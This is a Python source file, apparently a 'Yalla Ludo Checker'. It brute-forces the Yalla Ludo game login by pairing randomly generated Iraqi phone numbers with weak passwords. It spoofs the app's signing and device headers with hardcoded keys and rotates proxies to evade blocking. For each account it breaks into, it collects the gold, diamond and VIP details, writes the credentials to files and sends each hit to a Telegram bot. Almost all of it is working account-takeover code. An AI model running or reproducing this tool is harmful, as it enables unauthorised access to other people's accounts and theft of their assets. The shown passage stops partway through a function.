#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Yalla Ludo Checker v2 - Full Speed + Working Login + Telegram + Custom Passwords
# By @to_ls

import base64
import json
import hashlib
import hmac
import time
import uuid
import random
import struct
import asyncio
import aiohttp
import sys
import os
import threading
from collections import defaultdict
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich import box
    console = Console()
    RICH_AVAILABLE = True
except:
    RICH_AVAILABLE = False
    try:
        from colorama import init, Fore, Style
        init(autoreset=True)
    except:
        Fore = Style = type('obj', (object,), {
            'GREEN': '', 'RED': '', 'YELLOW': '', 'CYAN': '', 
            'MAGENTA': '', 'WHITE': '', 'RESET_ALL': ''
        })()

# ==================== كونفيغ ====================
VER = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
VERH = "1.4.9.2"
L3 = "L3)qk*@8"
K = "8a9520f016427a54d5de40335bf7e4fe"
MKEY = b"4e82797b276c5cb729db62aaa229a057"
MIV = b"0102030405060708"
HERA = "f580270da66e44438d5ed30fdb08ebba"
SPRE = "2.0_2_"
LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"

# ==================== تحسينات السرعة ====================
TIMEOUT = 0.1 # من 15 إلى 5 ثواني
CONCURRENCY = 500  # من 300 إلى 500
MAX_TASKS = 1000  # من 2000 إلى 1000

# ==================== متغيرات التليجرام ====================
BOT_TOKEN = ""
CHAT_IDS = []
TELEGRAM_ENABLED = False

# ==================== باسوردات افتراضية ====================
DEFAULT_PASSWORDS = ["qwer1234", "1234qwer", "1q2w3e4r", "qwert12345", "zxcv1234", "12345qwert"]

# ==================== سيرفرات ====================
LOGIN_SERVERS = [
    "https://httpgateway.carrstuv.com",
    "https://httpgateway.lampjkl.com",
    "https://httpgateway.funcdeg.com",
    "https://httpgateway.planecde.com",
    "https://httpgateway.yalla.games",
]

# ==================== هوست كونفيج ====================
HCONF = [
    {"bizType": 5000, "countryCode": "SA", "hostUrl": "https://api-shumeng.moonlmn.com", "type": 2, "version": 4},
    {"bizType": 5001, "countryCode": "", "hostUrl": "ws://firebreak.yalla.games", "type": 1, "version": 1},
    {"bizType": 5004, "countryCode": "SA", "hostUrl": "https://httpgateway.penabcd.com", "type": 2, "version": 6},
    {"bizType": 5005, "countryCode": "SA", "hostUrl": "https://api.lightkvd.com", "type": 2, "version": 4},
    {"bizType": 1000, "countryCode": "SA", "hostUrl": "https://account.lampjkl.com", "type": 2, "version": 19},
    {"bizType": 1001, "countryCode": "SA", "hostUrl": "https://pay.lampjkl.com", "type": 2, "version": 17},
    {"bizType": 1002, "countryCode": "SA", "hostUrl": "https://mail.lampjkl.com", "type": 2, "version": 18},
    {"bizType": 1003, "countryCode": "SA", "hostUrl": "https://clog.lampjkl.com", "type": 2, "version": 17},
    {"bizType": 1006, "countryCode": "SA", "hostUrl": "https://httpgateway.lampjkl.com", "type": 2, "version": 20},
    {"bizType": 1007, "countryCode": "SA", "hostUrl": "wss://tyr.lampjkl.com", "type": 2, "version": 18},
    {"bizType": 1008, "countryCode": "SA", "hostUrl": "wss://hall.lampjkl.com", "type": 2, "version": 39},
    {"bizType": 2006, "countryCode": "SA", "hostUrl": "https://nitrogen.lampjkl.com", "type": 2, "version": 19},
    {"bizType": 2007, "countryCode": "SA", "hostUrl": "wss://room.lampjkl.com", "type": 2, "version": 22},
    {"bizType": 2008, "countryCode": "SA", "hostUrl": "wss://roomgame.lampjkl.com", "type": 2, "version": 18},
    {"bizType": 3000, "countryCode": "SA", "hostUrl": "https://file.carrstuv.com", "type": 2, "version": 27},
    {"bizType": 6000, "countryCode": "", "hostUrl": "https://broadcast-host.ylconfig.com", "type": 1, "version": 0},
]

# ==================== أرقام ====================
PREFIXES = {
    "اسيا": ["770", "771", "772", "773", "774", "775", "776", "777", "778", "779"],
    "زين": ["780", "781", "782", "783", "784", "785", "786", "787", "788", "789"],
    "كورك": ["790", "791", "792", "793", "794", "795", "796", "797", "798", "799"]
}

used_numbers = set()
used_lock = threading.Lock()

def generate_mobile_iq():
    while True:
        company = random.choice(list(PREFIXES.keys()))
        prefix = random.choice(PREFIXES[company])
        suffix = ''.join(random.choices('0123456789', k=7))
        mobile = prefix + suffix
        with used_lock:
            if mobile not in used_numbers:
                used_numbers.add(mobile)
                return mobile

# ==================== دوال التشفير ====================
def _gen_shu_meng_id() -> str:
    import secrets
    raw = secrets.token_bytes(28)
    b64 = base64.b64encode(raw).decode()
    return b64.replace("+", "-").replace("/", "_").rstrip("=")[:38]

def _gen_traceparent() -> str:
    return f"00-{uuid.uuid4().hex + uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
            elif i < 32:
                f = (d & b) | (~d & c)
                g = (5*i+1) % 16
            elif i < 48:
                f = b ^ c ^ d
                g = (3*i+5) % 16
            else:
                f = c ^ (b | ~d)
                g = (7*i) % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d
            d = c
            c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0 = (a0 + a) & 0xffffffff
        b0 = (b0 + b) & 0xffffffff
        c0 = (c0 + c) & 0xffffffff
        d0 = (d0 + d) & 0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as padlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def _aes_cbc(key, iv, pt):
    pad = padlib.PKCS7(128).padder()
    pt2 = pad.update(pt) + pad.finalize()
    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    e = c.encryptor()
    return e.update(pt2) + e.finalize()

def _xor_b64(data_str, key_str):
    kb = key_str.encode()
    xo = bytes(b ^ kb[i % len(kb)] for i, b in enumerate(data_str.encode()))
    return base64.b64encode(xo).decode()

def encrypt(data, hera):
    k = md5r(hera.encode() + "L3)qk*@8".encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()

def decrypt_response(raw, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except:
        pass
    if hera:
        try:
            k = md5r(hera.encode() + "L3)qk*@8".encode()).encode()
            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
            dec = bytes(a ^ b for a, b in zip(raw, ks))
            return json.loads(dec.decode('utf-8'))
        except:
            pass
    return None

def sign(data, hera):
    key = md5r(hera.encode() + "L3)qk*@8".encode()).encode()
    return hmac.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    secret = "L3)qk*@8"
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b"4e82797b276c5cb729db62aaa229a057", AES.MODE_CBC, b"0102030405060708").encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def baggage(timestamp, dev):
    obj = {
        "timeSpan": timestamp,
        "version": "1.5.1.0",
        "deviceId": dev["deviceId"],
        "deviceName": dev["deviceName"],
        "deviceType": dev["deviceType"],
        "downloadChannelId": dev["downloadChannelId"],
        "shuMengId": dev["shuMengId"],
        "nonce": f"{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}",
        "plateType": dev["plateType"],
        "LanguageId": dev["LanguageId"],
        "phoneModel": dev["phoneModel"],
        "X-Phone-Country": dev["X-Phone-Country"],
        "X-Sim-Country": dev["X-Sim-Country"],
        "AndroidId": dev["AndroidId"],
        "appType": dev["appType"],
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body, dev):
    now = int(time.time() * 1000)
    hera = uuid.uuid4().hex
    bag = baggage(str(now), dev)
    endpoint = '/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin'
    signed = (endpoint + '' + "YallaLudo-1.5.0.0-(Build 1050003)-Android 32" + bag).encode('utf-8')

    xsign = f'2.0_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)

    enc_body = encrypt(body, hera)
    wire = json.dumps(
        {"paramJsonString": enc_body},
        separators=(',',':')
    ).encode('utf-8')

    ts_stamp = now + random.randint(40, 80)
    ts_time = ts_stamp + random.randint(30, 60)

    headers = {
        'User-Agent': "YallaLudo-1.5.0.0-(Build 1050003)-Android 32",
        'UserId': '0',
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': '',
        'X-Timestamp': str(ts_stamp),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(ts_time),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
        'Accept-Encoding': 'gzip',
        'Connection': 'Keep-Alive',
        'baggage': 'service.name=ludo',
        'traceparent': _gen_traceparent(),
    }

    return headers, wire, hera, dev

def payload(mobile, password_md5, dev):
    data = {
        "mobile": mobile,
        "areaCode": "964",
        "password": password_md5,
        "languageId": dev["LanguageId"],
        "nationalityId": "1",
        "hostConfig": HCONF,
        "simCountry": "IQ",
        "version": "1.5.1.0",
        "deviceId": dev["deviceId"],
        "deviceName": dev["deviceName"],
        "deviceType": dev["deviceType"],
        "downloadChannelId": dev["downloadChannelId"],
        "shuMengId": dev["shuMengId"],
        "nonce": f"{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}",
        "plateType": dev["plateType"],
        "phoneModel": dev["phoneModel"],
        "X-Phone-Country": dev["X-Phone-Country"],
        "X-Sim-Country": dev["X-Sim-Country"],
        "AndroidId": dev["AndroidId"],
        "IsSubpackages": 0,
        "appType": dev["appType"],
        "idfa": "",
    }
    return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')

# ==================== دالة تسجيل الدخول (محسنة) ====================
async def login_account(session, mobile, password_md5, dev=None, proxy=None):
    if dev is None:
        dev = {
            "deviceId": str(uuid.uuid4()),
            "deviceName": "Xiaomi Redmi Note 10",
            "deviceType": 2,
            "phoneModel": "M2101K7AG",
            "X-Phone-Country": "IQ",
            "X-Sim-Country": "IQ",
            "downloadChannelId": 1,
            "shuMengId": _gen_shu_meng_id(),
            "AndroidId": uuid.uuid4().hex[:32] + "_" + uuid.uuid4().hex[:16],
            "plateType": 0,
            "LanguageId": 2,
            "appType": 0,
        }
    
    body = payload(mobile, password_md5, dev)
    headers, wire, hera, dev = buildrequest(body, dev)
    
    # تجربة جميع السيرفرات مع مهلة قصيرة
    for server in LOGIN_SERVERS:
        try:
            url = server + LOGIN_PATH
            async with session.post(url, data=wire, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as resp:
                if resp.status != 200:
                    continue
                data = await resp.json()
                param = data.get("paramJsonString", "")
                if param:
                    raw = base64.b64decode(param)
                    result = decrypt_response(raw, hera)
                else:
                    result = data
                
                if result and result.get("status") == 0:
                    user_data = result.get("data", {})
                    token = user_data.get("token", "")
                    user_id = str(user_data.get("id", user_data.get("showNumId", "")))
                    
                    if token and user_id:
                        profile = await fetch_profile(session, token, user_id, dev, proxy)
                        return {
                            "success": True,
                            "data": user_data,
                            "token": token,
                            "user_id": user_id,
                            "dev": dev,
                            "profile": profile
                        }
                    else:
                        return {"success": True, "data": user_data, "token": token, "user_id": user_id, "dev": dev, "profile": None}
                elif result:
                    return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
        except asyncio.TimeoutError:
            continue
        except:
            continue
    
    return {"success": False, "error": "All servers failed"}

async def fetch_profile(session, token, user_id, dev, proxy=None):
    if not token or not user_id:
        return None
    
    # تجربة جميع السيرفرات مع مهلة قصيرة
    for server in LOGIN_SERVERS:
        try:
            now = int(time.time() * 1000)
            nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
            bag_sign = hashlib.md5(("c889f8f7dc69b1d67e1d3e43cf48f430" + nc).encode()).hexdigest().upper()
            
            bag = {
                "token": token,
                "sign": bag_sign,
                "timeSpan": str(now),
                "version": "1.4.9.2",
                "deviceId": dev["deviceId"],
                "deviceName": dev["deviceName"],
                "deviceType": dev["deviceType"],
                "downloadChannelId": dev["downloadChannelId"],
                "shuMengId": dev["shuMengId"],
                "nonce": nc,
                "plateType": dev["plateType"],
                "LanguageId": dev["LanguageId"],
                "phoneModel": dev["phoneModel"],
                "X-Phone-Country": dev["X-Phone-Country"],
                "X-Sim-Country": dev["X-Sim-Country"],
                "AndroidId": dev["AndroidId"],
                "appType": dev["appType"],
            }
            bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
            
            sg = PROFILE_PATH + token + "1.4.9.2" + bb
            sig = hmac.new("c889f8f7dc69b1d67e1d3e43cf48f430".encode(), sg.encode(), hashlib.sha256).hexdigest()
            xs = "2.0_2_" + sig
            
            p = hashlib.md5(sg.encode()).hexdigest()
            mp = f"{p}-{len(sg)}-c889f8f7dc69b1d67e1d3e43cf48f430-L3)qk*@8".encode()
            xm = base64.b64encode(_aes_cbc(b"4e82797b276c5cb729db62aaa229a057", b"0102030405060708", mp)).decode()
            
            pm = _xor_b64(json.dumps({"userId": int(user_id)}, separators=(",", ":")), "c889f8f7dc69b1d67e1d3e43cf48f430")
            
            headers = {
                "User-Agent": "YallaLudo-1.4.9.2-(Build 1040922)-Android 30",
                "UserId": str(user_id),
                "X-App-Id": "ludo",
                "X-Baggage": bb,
                "X-Access-Token": token,
                "X-Timestamp": str(now + random.randint(50, 300)),
                "versionString": "1.4.9.2",
                "X-Sign": xs,
                "X-Hera": "f580270da66e44438d5ed30fdb08ebba",
                "X-Time": str(now + random.randint(50, 300)),
                "X-Medusa": xm,
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
            }
            
            url = server + PROFILE_PATH
            async with session.post(url, json={"paramJsonString": pm}, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status in (403, 500, 404):
                    continue
                obj = await r.json()
                if obj.get("status") == 0:
                    data = obj.get("data") or {}
                    base = data.get("baseInfo") or data
                    if base.get("goldNum") is not None or base.get("diamondNum") is not None:
                        return data
                    else:
                        return data
        except asyncio.TimeoutError:
            continue
        except:
            continue
    return None

# ==================== دالة إرسال التليجرام ====================
async def send_telegram(session, account):
    global BOT_TOKEN, CHAT_IDS, TELEGRAM_ENABLED
    
    if not TELEGRAM_ENABLED or not BOT_TOKEN or not CHAT_IDS:
        return False
    
    vip_status = "✅ VIP" if account.get('is_vip', False) else "❌ Non-VIP"
    message = f"""🎯 Yalla Ludo HIT!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 Phone: <code>{account['phone']}</code>
🔑 Pass: <code>{account['password']}</code>
👤 Name: <b>{account.get('name', 'Unknown')}</b>
🆔 ID: <code>{account.get('uid', '')}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💰 Gold: <b>{account.get('gold', 0):,}</b>
💎 Diamond: <b>{account.get('diamond', 0):,}</b>
📊 Level: <b>{account.get('level', 0)}</b>
⭐ XP: <b>{account.get('exp', 0):,} / {account.get('max_exp', 0):,}</b>
👑 VIP: <b>{vip_status}</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

By @to_ls"""
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    success = True
    
    for chat_id in CHAT_IDS:
        sent = False
        for attempt in range(3):
            try:
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'HTML',
                    'disable_web_page_preview': True
                }
                async with session.post(url, data=payload, timeout=30) as resp:
                    if resp.status == 200:
                        if RICH_AVAILABLE:
                            console.print(f"[green][✓][/green] Sent to {chat_id}: {account['phone']}")
                        else:
                            print(f"[✓] Sent to {chat_id}: {account['phone']}")
                        sent = True
                        break
                    else:
                        await asyncio.sleep(1)
            except:
                await asyncio.sleep(1)
        
        if not sent:
            if RICH_AVAILABLE:
                console.print(f"[red][✗][/red] Failed to send to {chat_id}")
            else:
                print(f"[✗] Failed to send to {chat_id}")
            success = False
    
    return success

# ==================== حفظ النتائج ====================
def save_account_by_gold(account):
    gold = account.get('gold', 0)
    phone = account['phone']
    password = account['password']
    
    if gold < 1000000:
        filename = "gold_0_1M.txt"
    elif gold < 5000000:
        filename = "gold_1M_5M.txt"
    elif gold < 10000000:
        filename = "gold_5M_10M.txt"
    elif gold < 50000000:
        filename = "gold_10M_50M.txt"
    elif gold < 100000000:
        filename = "gold_50M_100M.txt"
    else:
        filename = "gold_100M_plus.txt"
    
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f"{phone}:{password}\n")
        return filename
    except:
        return None

def save_account_full_by_gold(account):
    filename = "good_accounts_full.txt"
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
        return True
    except:
        return False

def save_single_result(account):
    filename = "single_check_results.txt"
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            vip_status = "VIP" if account.get('is_vip', False) else "Non-VIP"
            f.write(f"Phone: {account['phone']} | Pass: {account['password']} | Name: {account.get('name', 'Unknown')} | ID: {account.get('uid', '')} | Gold: {account.get('gold', 0)} | Diamond: {account.get('diamond', 0)} | Level: {account.get('level', 0)} | VIP: {vip_status}\n")
        return True
    except:
        return False

# ==================== إحصائيات ====================
stats = defaultdict(int)
gold_stats = defaultdict(int)
diamond_stats = defaultdict(int)
level_stats = defaultdict(int)
vip_stats = defaultdict(int)
found_accounts = []
verify_accounts = []
stats_lock = threading.Lock()
stop_flag = False
start_time = time.time()

# ==================== بروكسي مانجر ====================
class ProxyManager:
    def __init__(self, proxy_file=""):
        self.proxies = []
        self.working_proxies = []
        self.failed_proxies = set()
        self.proxy_lock = threading.Lock()
        self.current_index = 0
        if proxy_file:
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file):
        try:
            if os.path.exists(proxy_file):
                with open(proxy_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            proxy = self._parse_proxy(line)
                            if proxy:
                                self.proxies.append(proxy)
                if RICH_AVAILABLE:
                    console.print(f"[green][+][/green] Loaded {len(self.proxies)} proxies")
                else:
                    print(f"[+] Loaded {len(self.proxies)} proxies")
            else:
                if RICH_AVAILABLE:
                    console.print(f"[yellow][!][/yellow] Proxy file not found: {proxy_file}")
                else:
                    print(f"[!] Proxy file not found: {proxy_file}")
        except Exception as e:
            if RICH_AVAILABLE:
                console.print(f"[red][-][/red] Error loading proxies: {e}")
            else:
                print(f"[-] Error loading proxies: {e}")
    
    def _parse_proxy(self, line):
        if '@' in line:
            parts = line.split('@')
            if len(parts) == 2:
                auth = parts[0].split(':')
                address = parts[1].split(':')
                if len(auth) == 2 and len(address) == 2:
                    return {'ip': address[0], 'port': address[1], 'user': auth[0], 'pass': auth[1]}
        parts = line.split(':')
        if len(parts) == 4:
            return {'ip': parts[0], 'port': parts[1], 'user': parts[2], 'pass': parts[3]}
        if len(parts) == 2:
            return {'ip': parts[0], 'port': parts[1], 'user': None, 'pass': None}
        return None
    
    def get_proxy(self):
        with self.proxy_lock:
            if self.working_proxies:
                proxy = random.choice(self.working_proxies)
                return self._format_proxy(proxy)
            if self.proxies:
                for _ in range(5):
                    proxy = self.proxies[self.current_index % len(self.proxies)]
                    self.current_index += 1
                    proxy_str = self._format_proxy(proxy)
                    if proxy_str not in self.failed_proxies:
                        return proxy_str
                proxy = self.proxies[self.current_index % len(self.proxies)]
                self.current_index += 1
                return self._format_proxy(proxy)
            return None
    
    def _format_proxy(self, proxy):
        if isinstance(proxy, dict):
            if proxy.get('user') and proxy.get('pass'):
                return f"http://{proxy['user']}:{proxy['pass']}@{proxy['ip']}:{proxy['port']}"
            return f"http://{proxy['ip']}:{proxy['port']}"
        return proxy

proxy_manager = None

# ==================== دالة الحصول على الباسوردات ====================
def get_passwords_list():
    """الحصول على قائمة الباسوردات من المستخدم"""
    print("\n[+] Password Options:")
    print("  [1] Use default passwords (القائمة الافتراضية)")
    print("  [2] Enter custom passwords (إدخال باسوردات مخصصة)")
    print("  [3] Use both (استخدام الاثنين معاً)")
    
    choice = input("\nSelect option (1/2/3): ").strip()
    
    if choice == "1":
        return DEFAULT_PASSWORDS.copy()
    
    elif choice == "2":
        print("\n[+] Enter passwords (one per line, empty line to finish):")
        passwords = []
        while True:
            pwd = input("> ").strip()
            if not pwd:
                break
            if pwd:
                passwords.append(pwd)
        if not passwords:
            print("[!] No passwords entered, using default list")
            return DEFAULT_PASSWORDS.copy()
        return passwords
    
    elif choice == "3":
        print("\n[+] Enter additional passwords (one per line, empty line to finish):")
        custom_passwords = []
        while True:
            pwd = input("> ").strip()
            if not pwd:
                break
            if pwd:
                custom_passwords.append(pwd)
        
        all_passwords = DEFAULT_PASSWORDS.copy()
        if custom_passwords:
            all_passwords.extend(custom_passwords)
        return all_passwords
    
    else:
        print("[!] Invalid choice, using default passwords")
        return DEFAULT_PASSWORDS.copy()

# ==================== فحص حساب واحد ====================
async def check_single_account(session, phone, password):
    print(f"\n[+] Checking: {phone} | {password}")
    
    pwd_md5 = md5upper(password)
    proxy = proxy_manager.get_proxy() if proxy_manager else None
    
    try:
        result = await login_account(session, phone, pwd_md5, proxy=proxy)
        
        if result.get("success"):
            data = result.get("data", {})
            name = data.get("name", data.get("nickName", ""))
            uid = result.get("user_id", "")
            
            if not name or name == "" or name == "Unknown" or name == " ":
                print(f"\n[!] VERIFICATION NEEDED: {phone} | {password}")
                print(f"    Name: EMPTY - Account needs verification")
                account = {'phone': phone, 'password': password, 'name': name, 'uid': uid, 'status': 'verification_needed'}
                save_single_result(account)
                return account
            
            gold = 0
            diamond = 0
            level = 0
            exp = 0
            max_exp = 0
            royal = 0
            is_vip = False
            vip_type = ""
            
            profile = result.get("profile")
            if profile:
                base = profile.get("baseInfo", profile)
                gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
                diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
                level = int(base.get("levelId", base.get("level", 0)) or 0)
                exp = int(base.get("experience", 0) or 0)
                max_exp = int(base.get("maxExp", 100) or 100)
                royal = int(base.get("royalLevel", 0) or 0)
                is_vip = base.get("isVip", False)
                vip_info = profile.get("vipInfo", {})
                if vip_info:
                    vip_type = vip_info.get("vipType", "")
                    if not vip_type and is_vip:
                        vip_type = "VIP"
            
            account_data = {
                'phone': phone,
                'password': password,
                'name': name,
                'uid': uid,
                'gold': gold,
                'diamond': diamond,
                'level': level,
                'exp': exp,
                'max_exp': max_exp,
                'royal': royal,
                'is_vip': is_vip,
                'vip_type': vip_type,
                'status': 'success'
            }
            
            print(f"""
✅ SUCCESS!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 Phone: {phone}
🔑 Password: {password}
👤 Name: {name}
🆔 ID: {uid}
💰 Gold: {gold:,}
💎 Diamond: {diamond:,}
📊 Level: {level}
⭐ XP: {exp:,} / {max_exp:,}
👑 VIP: {'✅ Yes' if is_vip else '❌ No'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
            
            save_single_result(account_data)
            
            if TELEGRAM_ENABLED:
                await send_telegram(session, account_data)
            
            return account_data
            
        else:
            if "error" in result:
                error_msg = result.get("error", "")
                print(f"\n❌ Error: {error_msg}")
                return {'phone': phone, 'password': password, 'status': 'error', 'message': error_msg}
            
            status = result.get("status", -1)
            tips = result.get("tips", "")
            
            if status == 151 or ("كلمة السر" in str(tips) and "خاطئة" in str(tips)):
                print(f"\n❌ Wrong password: {phone} | {password}")
                return {'phone': phone, 'password': password, 'status': 'wrong_password', 'message': tips}
            elif status == 500 or ("غير مسجل" in str(tips) or "not registered" in str(tips).lower()):
                print(f"\n❌ Not registered: {phone}")
                return {'phone': phone, 'password': password, 'status': 'not_registered', 'message': tips}
            else:
                print(f"\n⚠️ Status: {status} - {tips}")
                return {'phone': phone, 'password': password, 'status': f'status_{status}', 'message': tips}
                
    except asyncio.TimeoutError:
        print(f"\n❌ Timeout: {phone}")
        return {'phone': phone, 'password': password, 'status': 'timeout'}
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        return {'phone': phone, 'password': password, 'status': 'error', 'message': str(e)}

# ==================== فحص عشوائي ====================
async def check_random_async(session, mobile, semaphore, passwords_list, proxy=None):
    global stats, gold_stats, diamond_stats, level_stats, vip_stats, found_accounts, verify_accounts, stop_flag
    async with semaphore:
        for pwd in passwords_list:
            if stop_flag:
                return
            
            pwd_md5 = md5upper(pwd)
            
            try:
                result = await login_account(session, mobile, pwd_md5, proxy=proxy)
                
                if result.get("success"):
                    data = result.get("data", {})
                    name = data.get("name", data.get("nickName", ""))
                    uid = result.get("user_id", "")
                    
                    if not name or name == "" or name == "Unknown" or name == " ":
                        with stats_lock:
                            stats['verification_needed'] += 1
                            stats['total'] += 1
                        
                        verify_account = {
                            'phone': mobile,
                            'password': pwd,
                            'name': name if name else 'EMPTY',
                            'uid': uid,
                            'reason': 'EMPTY_NAME'
                        }
                        verify_accounts.append(verify_account)
                        
                        if RICH_AVAILABLE:
                            console.print(f"\n[yellow][!][/yellow] VERIFICATION NEEDED: [bold]{mobile}[/bold] | {pwd}")
                            console.print(f"    Name: [red]EMPTY[/red] - Account needs verification")
                        else:
                            print(f"\n[!] VERIFICATION NEEDED: {mobile} | {pwd}")
                            print(f"    Name: EMPTY - Account needs verification")
                        return
                    
                    gold = 0
                    diamond = 0
                    level = 0
                    exp = 0
                    max_exp = 0
                    royal = 0
                    is_vip = False
                    vip_type = ""
                    
                    profile = result.get("profile")
                    if profile:
                        base = profile.get("baseInfo", profile)
                        gold = int(base.get("goldNum", base.get("gold", 0)) or 0)
                        diamond = int(base.get("diamondNum", base.get("diamond", 0)) or 0)
                        level = int(base.get("levelId", base.get("level", 0)) or 0)
                        exp = int(base.get("experience", 0) or 0)
                        max_exp = int(base.get("maxExp", 100) or 100)
                        royal = int(base.get("royalLevel", 0) or 0)
                        is_vip = base.get("isVip", False)
                        vip_info = profile.get("vipInfo", {})
                        if vip_info:
                            vip_type = vip_info.get("vipType", "")
                            if not vip_type and is_vip:
                                vip_type = "VIP"
                    
                    account_data = {
                        'phone': mobile,
                        'password': pwd,
                        'name': name,
                        'uid': uid,
                        'gold': gold,
                        'diamond': diamond,
                        'level': level,
                        'exp': exp,
                        'max_exp': max_exp,
                        'royal': royal,
                        'is_vip': is_vip,
                        'vip_type': vip_type
                    }
                    
                    with stats_lock:
                        stats['good'] += 1
                        stats['total'] += 1
                        
                        if gold < 1000000:
                            gold_stats["0-999K"] += 1
                        elif gold < 5000000:
                            gold_stats["1M-4.9M"] += 1
                        elif gold < 10000000:
                            gold_stats["5M-9.9M"] += 1
                        elif gold < 50000000:
                            gold_stats["10M-49M"] += 1
                        elif gold < 100000000:
                            gold_stats["50M-99M"] += 1
                        else:
                            gold_stats["100M+"] += 1
                        
                        if diamond < 10000:
                            diamond_stats["0-9.9K"] += 1
                        elif diamond < 50000:
                            diamond_stats["10K-49K"] += 1
                        elif diamond < 100000:
                            diamond_stats["50K-99K"] += 1
                        elif diamond < 500000:
                            diamond_stats["100K-499K"] += 1
                        elif diamond < 1000000:
                            diamond_stats["500K-999K"] += 1
                        else:
                            diamond_stats["1M+"] += 1
                        
                        if level < 10:
                            level_stats["Level 0-9"] += 1
                        elif level < 20:
                            level_stats["Level 10-19"] += 1
                        elif level < 30:
                            level_stats["Level 20-29"] += 1
                        elif level < 40:
                            level_stats["Level 30-39"] += 1
                        else:
                            level_stats["Level 40+"] += 1
                        
                        if is_vip:
                            vip_stats["VIP"] += 1
                            if vip_type:
                                vip_stats[f"VIP_{vip_type}"] += 1
                        else:
                            vip_stats["Non-VIP"] += 1
                        
                        found_accounts.append(account_data)
                    
                    saved_file = save_account_by_gold(account_data)
                    save_account_full_by_gold(account_data)
                    
                    if RICH_AVAILABLE:
                        console.print(f"\n[green][+][/green] GOOD: [bold green]{mobile}[/bold green] | [bold yellow]{pwd}[/bold yellow]")
                        console.print(f"    Name: {name}")
                        console.print(f"    ID: {uid}")
                        console.print(f"    Gold: [green]{gold:,}[/green]")
                        console.print(f"    Diamond: [green]{diamond:,}[/green]")
                        console.print(f"    Level: [green]{level}[/green]")
                        if is_vip:
                            vip_text = f"✅ Yes"
                            if vip_type:
                                vip_text += f" ({vip_type})"
